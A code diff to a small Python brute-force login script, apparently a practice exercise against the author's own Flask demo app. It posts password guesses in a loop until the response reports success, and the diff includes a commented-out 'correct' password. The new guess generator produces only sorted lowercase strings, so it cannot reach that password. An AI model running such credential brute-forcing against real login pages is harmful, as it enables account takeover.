@@ -2,9 +2,8 @@
 
 ' Performs brute-force attacks against the target '
 
-import requests
-import time
-import sys
+import time, sys
+import requests, itertools
 from flask_app import var
 
 try:
@@ -28,7 +27,7 @@ def try_password(trial=''):
     ' Send POST request attempt with password '
     try:
         data['password'] = ''.join(trial)
-        print(data['password'])
+        print('Try:', data['password'])
         res = sess.post(url, data=data)
         if 'success' in res.text:  # if brute-force successful
             return 'Success'
@@ -41,33 +40,18 @@ def try_password(trial=''):
 
 def main():
     ' Perform Brute force attack '
-    password = '.5_pFO*p6s8Kcj+K'
-    password = list(password)
-    for attempt in range(15):
+    # correct_password = '.5_pFO*p6s8Kcj+U'
+    
+    start_text = 'abcdefghijklmnopqrstuvwxyz'  # text for first attempt
+    length = len(start_text)  # how many char in password
+    generator = itertools.combinations_with_replacement(start_text, length)
+    for password in generator:
         res = try_password(password)
         if res:  # if there is response, stop attack
             print(res)
             break
-        if password[-1] == '~':  # last char can't be increased
-            password[-1] = '!'
-            if password[-2] == '~':
-                pass
-            else:
-                password[-2] = chr(ord(password[-2]) + 1)
-        else:
-            password[-1] = chr(ord(password[-1]) + 1)  # increase last character
         time.sleep(1)  # wait for 1 second before next attempt
 
 
 if __name__ == '__main__':
     main()
-
-
-'''
-Note:
-for x in range(150):
-    print(x, chr(x))
-
-Characters which can be in password
-33 !  to 126 ~
-'''
